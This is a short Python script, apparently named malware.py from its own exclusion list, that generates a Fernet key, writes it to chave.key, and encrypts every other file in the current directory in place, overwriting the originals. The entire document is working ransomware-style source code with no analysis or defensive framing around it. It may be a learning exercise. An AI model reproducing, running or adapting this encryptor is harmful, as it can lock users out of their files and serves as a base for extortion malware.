import os
from cryptography.fernet import Fernet

def generate_and_save_key(key_filename="chave.key"):
    key = Fernet.generate_key()
    with open(key_filename, "wb") as chave:
        chave.write(key)
    return key

def encrypt_file(file_path, key):
    with open(file_path, "rb") as arquivo:
        conteudo = arquivo.read()
    conteudo_encrypted = Fernet(key).encrypt(conteudo)
    with open(file_path, "wb") as arquivo:
        arquivo.write(conteudo_encrypted)

def encrypt_files_in_directory(directory, key):
    exclude_files = {"malware.py", "chave.key", "descript.py"}
    files = [file for file in os.listdir(directory) if file not in exclude_files and os.path.isfile(os.path.join(directory, file))]

    for file in files:
        file_path = os.path.join(directory, file)
        encrypt_file(file_path, key)

if __name__ == "__main__":
    key = generate_and_save_key()

    current_directory = os.getcwd()
    encrypt_files_in_directory(current_directory, key)
